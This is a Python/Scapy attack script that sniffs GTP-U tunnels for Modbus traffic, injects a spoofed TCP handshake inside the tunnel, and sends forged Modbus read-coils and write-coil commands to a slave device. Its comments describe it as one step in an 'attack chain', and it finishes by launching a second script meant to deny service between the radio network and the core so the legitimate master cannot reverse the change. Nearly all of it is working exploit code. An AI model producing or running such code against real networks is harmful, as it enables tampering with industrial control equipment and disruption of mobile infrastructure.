import time
import subprocess
from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet import IP
from scapy.sendrecv import sniff

# Variables for GTP tunnel information
gtp_flows = {}
capture_duration = 2
sniff_interface = "eth2"  # Specify the interface to sniff on
send_interface = "eth1"  # Specify the interface for sending Modbus traffic

# Modbus variables
modbus_master_spoofed_ip = "10.0.2.75"  # Modify with the secondary Modbus master IP
modbus_master_spoofed_port = 6664
modbus_slave_ip = None
gtp_src_ip = None
gtp_dst_ip = None

# Specify the MAC addresses for the Ethernet layer
modbus_slave_mac = "00:50:56:86:23:b8"  # Obtain from SPAN MAC Address going towards Core for ICS Mgt Workstation
modbus_master_mac = "00:e0:4c:68:0a:78"   # Obtain from L2 connection going to RAN or FW port if between

# Pass values between functions
packet_bytes_ack_int = 0
packet_bytes_seq_int = 0
tcp_seq = 0

# Function to process GTP packets and extract flow information
def sniff_gtp_info(packet):
    global modbus_slave_ip
    global gtp_src_ip
    global gtp_dst_ip

    if IP in packet and UDP in packet and Raw in packet:
        if packet[UDP].dport == 2152 and packet[Raw].load.startswith(b'\x30'):
            gtp_src_ip = packet[IP].src
            gtp_dst_ip = packet[IP].dst
            gtp_teid = int.from_bytes(packet[Raw].load[4:8], 'big')

            # Extract internal IP addresses from the encapsulated IP header
            inner_ip = packet[Raw].load[8:]
            inner_packet = IP(inner_ip)

            # Check if Modbus traffic is detected for communications from the master to the slave
            if TCP in inner_packet and inner_packet[TCP].dport == 502:
                modbus_src_ip = inner_packet.src
                modbus_dst_ip = inner_packet.dst
                modbus_tcp_payload = bytes(inner_packet[TCP].payload)

                # Check if the flow is not already captured
                if (gtp_src_ip, gtp_dst_ip, gtp_teid) not in gtp_flows:
                    gtp_flows[(gtp_src_ip, gtp_dst_ip, gtp_teid)] = {
                        'modbus_master_ip': modbus_master_spoofed_ip,
                        'modbus_slave_ip': modbus_dst_ip,
                        'modbus_tcp_payload': modbus_tcp_payload }

                    print("Modbus traffic detected!")
                    print("GTP Source IP:", gtp_src_ip)
                    print("GTP Destination IP:", gtp_dst_ip)
                    print("TEID:", gtp_teid)
                    print("Modbus Master IP:", modbus_src_ip)
                    print("Modbus Master Spoofed IP:", modbus_master_spoofed_ip)
                    print("Modbus Slave IP:", modbus_dst_ip)
                    print("------------------------")

            else:
                print("No Modbus Traffic Detected")

# Function to send a TCP connection
def send_tcp_connection():
    global modbus_master_mac
    global modbus_slave_mac
    global packet_bytes_seq_int
    global tcp_seq

    if len(gtp_flows) > 0:
        # Get the first flow information
        flow_key, flow_info = next(iter(gtp_flows.items()))
        gtp_src_ip, gtp_dst_ip, gtp_teid = flow_key
        modbus_master_ip = flow_info['modbus_master_ip']
        modbus_slave_ip = flow_info['modbus_slave_ip']

        # Create IP layer for the encapsulated IP packet
        ip_header = IP(src=modbus_slave_ip, dst=modbus_master_ip)  # Swap source and destination IP addresses

        # Create TCP SYN layer for the TCP 3-way handshake
        syn_packet = ip_header / TCP(sport=modbus_master_spoofed_port, dport=502, flags="S", window=1023)

        # Create IP layer for the encapsulated TCP connection
        ip_header = IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip)

        # Create TCP layer for the initial SYN TCP connection
        isn = random.getrandbits(32)
        seq = isn
        tcp_header_syn = TCP(sport=modbus_master_spoofed_port, dport=502, flags="S", seq=seq)  # Set SYN flag

        # Encapsulate TCP SYN packet within GTP payload
        gtp_payload_syn = ip_header / tcp_header_syn

        # Create GTP packet with encapsulated IP and TCP layers
        gtp_header = b'\x30\xff' + (len(gtp_payload_syn)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')
        gtp_packet_syn = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
                     IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
                     UDP(sport=2152, dport=2152) / \
                     Raw(load=gtp_header) / gtp_payload_syn

        # Show the generated GTP packet
        print("Initiating TCP 3-way Handshake Connection:")
        gtp_packet_syn.show()

        # Send GTP packet with encapsulated TCP connection
        sendp(gtp_packet_syn, iface=send_interface)
        print("Listening for SYN/ACK response on interface", sniff_interface)
        expected_ack = tcp_header_syn.seq + 1
        print("Expected Ack", expected_ack)
        syn_ack_packet = None

        # Define expected ack location to match expected_ack
        ack_start_byte = 36
        ack_end_byte = 39
        seq_start_byte = 32
        seq_end_byte = 35

        # Define function to extract the bytes within the specified range to find ack
        def find_syn_ack_packet(packet):
            global packet_bytes_ack_int
            global packet_bytes_seq_int
            raw_layer = packet.getlayer(Raw)
            if raw_layer is not None and len(raw_layer.load) >= ack_end_byte + 1:
                packet_bytes_ack = raw_layer.load[ack_start_byte:ack_end_byte + 1]
                packet_bytes_ack_int = int.from_bytes(packet_bytes_ack, byteorder='big')
                print("Evaluated packet Acks:", packet_bytes_ack_int)

                # Check if the byte sequence matches the expected_ack sequence
                if packet_bytes_ack == expected_ack.to_bytes(ack_end_byte - ack_start_byte + 1, 'big'):
                    print("Packet ack matches the expected ack!")
                    packet.show()

                    # Now extract the seq number for the ack packet
                    packet_bytes_seq = raw_layer.load[seq_start_byte:seq_end_byte +1]
                    packet_bytes_seq_int = int.from_bytes(packet_bytes_seq, byteorder='big')
                    print("Sequence number for ACK:", packet_bytes_seq_int)
            else:
                print("Packet does not have the expected payload structure or payload is empty")

        # Sniff packets to find SYN/ACK response with matching acknowledgment
        response = sniff(filter=f'udp and src {gtp_dst_ip} and dst {gtp_src_ip} and port 2152', 
              prn=find_syn_ack_packet,
              iface=sniff_interface,
              timeout=2,
              count=30)
        if response:
            syn_ack_packet = response[0]
        if syn_ack_packet:
            print("Received SYN/ACK response packet:")

            # Send ACK packet encapsulated in GTP tunnel
            if packet_bytes_ack_int is not None and packet_bytes_seq_int is not None:
               tcp_header_ack = TCP(sport=tcp_header_syn.sport, 
                    dport=tcp_header_syn.dport,
                    flags="A",
                    seq=tcp_header_syn.seq + 1,
                    ack=packet_bytes_seq_int + 1,
                    window=1023)
            else:
                print("Error: Unable to retrieve valid sequence and acknowledgment numbers.")
                return

            # Create GTP Encapsulated TCP ACK Packet
            gtp_payload = IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip) / tcp_header_ack / b''
            gtp_header = b'\x30\xff' + (len(gtp_payload)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')
            gtp_packet_ack = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
                             IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
                             UDP(sport=2152, dport=2152) / \
                             Raw(load=gtp_header) / gtp_payload

            # Pass seq number to global variable for use in next function
            tcp_seq = tcp_header_syn.seq + 1

            # Show the generated GTP ACK packet
            print("Sending ACK packet:")
            gtp_packet_ack.show()

            # Send ACK packet with encapsulated TCP connection
            sendp(gtp_packet_ack, iface=send_interface)

def send_modbus_read_coils():
    global modbus_master_mac
    global modbus_slave_mac
    global packet_bytes_seq_int
    global tcp_seq

    if len(gtp_flows) > 0:
        # Get the first flow information
        flow_key, flow_info = next(iter(gtp_flows.items()))
        gtp_src_ip, gtp_dst_ip, gtp_teid = flow_key
        modbus_master_ip = flow_info['modbus_master_ip']
        modbus_slave_ip = flow_info['modbus_slave_ip']

        # Create Modbus Read Coils request
        modbus_request = b'\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x0a'
        modbus_read_bytes_for_seq = 12
        tcp_ack = packet_bytes_seq_int + 1

        # Create Modbus Read Coils TCP Header
        tcp_header = (TCP(
            sport=modbus_master_spoofed_port,
            dport=502,
            flags="PA",
            seq=tcp_seq,
            ack=tcp_ack,
            window=1023
            ) / Raw(load=modbus_request))

        # Set correct TCP length
        tcp_length = len(tcp_header) + len(modbus_request)
        tcp_header.len = tcp_length
        print("TCP Length", tcp_header.len)

        # Encapsulate TCP SYN packet within GTP payload
        gtp_modbus_payload = (IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip) / tcp_header)

        # Create GTP packet with encapsulated Modbus Read Coils request
        gtp_header = b'\x30\xff' + (len(gtp_modbus_payload)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')

        gtp_packet_read = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
                     IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
                     UDP(sport=2152, dport=2152) / \
                     Raw(load=gtp_header) / gtp_modbus_payload

        # Show the generated GTP packet
        print("Simulated Modbus Read Coils request:")
        gtp_packet_read.show()

        # Send GTP packet with encapsulated Modbus Read Coils request
        sendp(gtp_packet_read, iface=send_interface)

        print("Listening for Modbus Read Coils response on interface", sniff_interface)
        response = sniff(filter=f'udp and src {modbus_slave_ip} and dst {modbus_master_spoofed_ip}',
                        iface=sniff_interface, timeout=5)
        if response:
            print("Received Modbus response packet:")
            response[0].show()

        expected_ack = tcp_seq + 12
        print("Expected Ack", expected_ack)
        syn_ack_packet = None

        # Define expected ack location to match expected_ack
        ack_start_byte = 36
        ack_end_byte = 39
        seq_start_byte = 32
        seq_end_byte = 35

        # Define function to extract the bytes within the specified range to find ack
        def find_ack_packet(packet):
            global packet_bytes_ack_int
            global packet_bytes_seq_int
            raw_layer = packet.getlayer(Raw)
            if raw_layer is not None and len(raw_layer.load) >= ack_end_byte + 1:
                packet_bytes_ack = raw_layer.load[ack_start_byte:ack_end_byte + 1]
                packet_bytes_ack_int = int.from_bytes(packet_bytes_ack, byteorder='big')
                print("Evaluated packet Acks:", packet_bytes_ack_int)

                # Check if the byte sequence matches the expected_ack sequence
                if packet_bytes_ack == expected_ack.to_bytes(ack_end_byte - ack_start_byte + 1, 'big'):
                    print("Packet ack matches the expected ack!")
                    packet.show()

                    # Now extract the seq number for the ack packet
                    packet_bytes_seq = raw_layer.load[seq_start_byte:seq_end_byte +1]
                    packet_bytes_seq_int = int.from_bytes(packet_bytes_seq, byteorder='big')
                    print("Sequence number for ACK:", packet_bytes_seq_int)
            else:
                print("Packet does not have the expected payload structure or payload is empty")

        # Sniff packets to find SYN/ACK response with matching acknowledgment
        response = sniff(filter=f'udp and src {gtp_dst_ip} and dst {gtp_src_ip} and port 2152', 
              prn=find_ack_packet,
              iface=sniff_interface,
              timeout=2,
              count=10)
        if response:
            ack_packet = response[0]
        if ack_packet:
            print("Received Read Coils response packet:")
            # Send ACK packet encapsulated in GTP tunnel
            if packet_bytes_ack_int is not None and packet_bytes_seq_int is not None:
               tcp_header_ack = TCP(sport=modbus_master_spoofed_port, 
                    dport=502,
                    flags="A",
                    seq=tcp_seq + 12,
                    ack=packet_bytes_seq_int + 11,
                    window=1023)
            else:
                print("Error: Unable to retrieve valid sequence and acknowledgment numbers.")
                return

            gtp_payload = IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip) / tcp_header_ack / b''
            gtp_header = b'\x30\xff' + (len(gtp_payload)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')
            gtp_packet_ack = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
                             IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
                             UDP(sport=2152, dport=2152) / \
                             Raw(load=gtp_header) / gtp_payload

            # Pass seq number to global variable for use in next function
            tcp_seq = tcp_seq + 12

            # Show the generated GTP ACK packet
            print("Sending ACK packet:")
            gtp_packet_ack.show()

            # Send ACK packet with encapsulated TCP connection
            sendp(gtp_packet_ack, iface=send_interface)

def send_modbus_write_coils():
    global modbus_master_mac
    global modbus_slave_mac
    global packet_bytes_seq_int
    global tcp_seq

    if len(gtp_flows) > 0:
        # Get the first flow information
        flow_key, flow_info = next(iter(gtp_flows.items()))
        gtp_src_ip, gtp_dst_ip, gtp_teid = flow_key
        modbus_master_ip = flow_info['modbus_master_ip']
        modbus_slave_ip = flow_info['modbus_slave_ip']

        # Create Modbus Read Coils request
        # Turn off LED b'\x00\x00\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00'
        # Turn on LED b'\x00\x00\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00'
        modbus_write_request = b'\x00\x00\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00'
        modbus_read_bytes_for_seq = 12
        tcp_ack = packet_bytes_seq_int + 1

        # Create Modbus Read Coils TCP Header
        tcp_header = (TCP(
            sport=modbus_master_spoofed_port,
            dport=502,
            flags="PA",
            seq=tcp_seq,
            ack=tcp_ack,
            window=1023
            ) / Raw(load=modbus_write_request))

        # Set correct TCP length
        tcp_length = len(tcp_header) + len(modbus_write_request)
        tcp_header.len = tcp_length
        print("TCP Length", tcp_header.len)

        # Encapsulate TCP SYN packet within GTP payload
        gtp_modbus_payload = (IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip) / tcp_header)

        # Create GTP packet with encapsulated Modbus Read Coils request
        gtp_header = b'\x30\xff' + (len(gtp_modbus_payload)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')
        gtp_packet_write = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
                     IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
                     UDP(sport=2152, dport=2152) / \
                     Raw(load=gtp_header) / gtp_modbus_payload

        # Show the generated GTP packet
        print("Sending Modbus Write Coils request:")
        gtp_packet_write.show()

        # Send GTP packet with encapsulated Modbus Read Coils request
        sendp(gtp_packet_write, iface=send_interface)
# This portion of script is for future development to provide functionality to interactively Write Coils and
# Read Coils.  This is commented out to facilitate attack chain to execute DOS on Core to prevent Modbus Master
# from changing settings and performing a write coils to reset change made by attack script.
#        print("Listening for Modbus Write Coils response on interface", sniff_interface)
#        response = sniff(filter=f'udp and src {modbus_slave_ip} and dst {modbus_master_spoofed_ip}',
#                        iface=sniff_interface, timeout=5)
#        if response:
#            print("Received Modbus Write Coils response packet:")
#            response[0].show()

#        expected_ack = tcp_seq + 12
#        print("Expected Ack", expected_ack)
#        syn_ack_packet = None
        # Define expected ack location to match expected_ack
#        ack_start_byte = 36
#        ack_end_byte = 39
#        seq_start_byte = 32
#        seq_end_byte = 35
        # Define function to extract the bytes within the specified range to find ack
#        def find_ack_packet(packet):
#            global packet_bytes_ack_int
#            global packet_bytes_seq_int
#            raw_layer = packet.getlayer(Raw)
#            if raw_layer is not None and len(raw_layer.load) >= ack_end_byte + 1:
#                packet_bytes_ack = raw_layer.load[ack_start_byte:ack_end_byte + 1]
#                packet_bytes_ack_int = int.from_bytes(packet_bytes_ack, byteorder='big')
#                print("Evaluated packet Acks:", packet_bytes_ack_int)
                # Check if the byte sequence matches the expected_ack sequence
#                if packet_bytes_ack == expected_ack.to_bytes(ack_end_byte - ack_start_byte + 1, 'big'):
#                    print("Packet ack matches the expected ack!")
#                    packet.show()
                    # Now extract the seq number for the ack packet
#                    packet_bytes_seq = raw_layer.load[seq_start_byte:seq_end_byte +1]
#                    packet_bytes_seq_int = int.from_bytes(packet_bytes_seq, byteorder='big')
#                    print("Sequence number for ACK:", packet_bytes_seq_int)
#            else:
#                print("Packet does not have the expected payload structure or payload is empty")
        # Sniff packets to find SYN/ACK response with matching acknowledgment
#        response = sniff(filter=f'udp and src {gtp_dst_ip} and dst {gtp_src_ip} and port 2152', 
#              prn=find_ack_packet,
#              iface=sniff_interface,
#              timeout=2,
#              count=30)
#        if response:
#            ack_packet = response[0]
#        if ack_packet:
#            print("Received Write Coils response packet:")
            # Send ACK packet encapsulated in GTP tunnel
#            if packet_bytes_ack_int is not None and packet_bytes_seq_int is not None:
#               tcp_header_ack = TCP(sport=modbus_master_spoofed_port, 
#                    dport=502,
#                    flags="A",
#                    seq=tcp_seq + 12,
#                    ack=packet_bytes_seq_int + 11,
#                    window=1023)
#            else:
#                print("Error: Unable to retrieve valid sequence and acknowledgment numbers.")
#                return

#            gtp_payload = IP(src=modbus_master_spoofed_ip, dst=modbus_slave_ip) / tcp_header_ack / b''
#            gtp_header = b'\x30\xff' + (len(gtp_payload)).to_bytes(2, 'big') + gtp_teid.to_bytes(4, 'big')
#            gtp_packet_write_ack = Ether(src=modbus_master_mac, dst=modbus_slave_mac) / \
#                             IP(src=gtp_src_ip, dst=gtp_dst_ip) / \
#                             UDP(sport=2152, dport=2152) / \
#                             Raw(load=gtp_header) / gtp_payload

            # Pass seq number to global variable for use in next function
#            tcp_seq = tcp_seq + 1

            # Show the generated GTP ACK packet
#            print("Sending ACK packet:")
#            gtp_packet_write_ack.show()

            # Send ACK packet with encapsulated TCP connection
#            sendp(gtp_packet_write_ack, iface=send_interface)

try:
    # Sniff GTP tunnel for Modbus traffic from Modbus master to slave
    print("Sniffing GTP tunnels for Modbus traffic from Modbus master to slave...")
    sniff(filter='udp and port 2152', prn=sniff_gtp_info, iface=sniff_interface, timeout=capture_duration)

    # Initiate TCP connection inside the GTP tunnel
    send_tcp_connection()

    # Send Modbus Read Coils request
    send_modbus_read_coils()

    # Send Modbus Write Coils request
    send_modbus_write_coils()

    # Open next python script in attack chain to initiate DOS between RAN and Core
    subprocess.run(["python", "UE-Attach-Request-CLI.py", "10000"])

except KeyboardInterrupt:
    # Print captured GTP flow information
    print("Captured GTP flows:")
    for flow_key, flow_info in gtp_flows.items():
        gtp_src_ip, gtp_dst_ip, gtp_teid = flow_key
        print("GTP Source IP:", gtp_src_ip)
        print("GTP Destination IP:", gtp_dst_ip)
        print("TEID:", gtp_teid)
        print("Modbus Master IP:", flow_info['modbus_master_ip'])
        print("Modbus Slave IP:", flow_info['modbus_slave_ip'])
        print("------------------------")
